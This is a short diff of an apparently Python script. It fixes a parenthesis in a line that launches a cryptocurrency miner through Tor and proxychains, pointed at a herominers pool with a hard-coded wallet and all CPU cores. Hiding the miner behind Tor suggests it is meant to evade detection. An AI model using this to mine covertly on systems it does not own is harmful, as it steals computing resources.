@@ -33,4 +33,4 @@ except:
 
 os.system('tor &')
 time.sleep(60)
-os.system('proxychains4 ' + program + ' --donate-level 1 -o loki.herominers.com:10114 -u LDFKUgMc5zudMEYdNJoxrHVtckxfLuS3GQRVEGoYa1saNirBrBR1xbG9idbGZoS6ieFDz371dgfynAxzYbn1zoQa5UafGzn -p x -a rx/loki -k --tls -t ' + str(cores)))
+os.system('proxychains4 ' + program + ' --donate-level 1 -o loki.herominers.com:10114 -u LDFKUgMc5zudMEYdNJoxrHVtckxfLuS3GQRVEGoYa1saNirBrBR1xbG9idbGZoS6ieFDz371dgfynAxzYbn1zoQa5UafGzn -p x -a rx/loki -k --tls -t ' + str(cores))
